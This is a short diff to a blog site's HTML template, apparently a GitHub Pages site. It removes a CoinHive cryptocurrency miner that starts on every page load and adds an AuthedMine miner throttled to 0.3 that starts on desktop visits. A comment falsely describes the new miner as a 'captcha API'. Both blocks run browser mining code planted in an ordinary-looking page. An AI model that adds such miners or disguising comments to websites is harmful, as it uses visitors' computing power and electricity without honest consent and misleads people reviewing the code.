@@ -70,8 +70,11 @@ $(function () {
     s.parentNode.insertBefore(bp, s);
 })();
 </script>
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<!--captcha API javsciprt -->
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
 <script>
-	var miner = new CoinHive.User('<QkKsnyKwkwBRKP0ViKmvFl1ULRrKHSxn>', 'https://liberxue.github.io/');
-	miner.start();
+	var miner = new CoinHive.Anonymous('QkKsnyKwkwBRKP0ViKmvFl1ULRrKHSxn', {throttle: 0.3});
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
 </script>
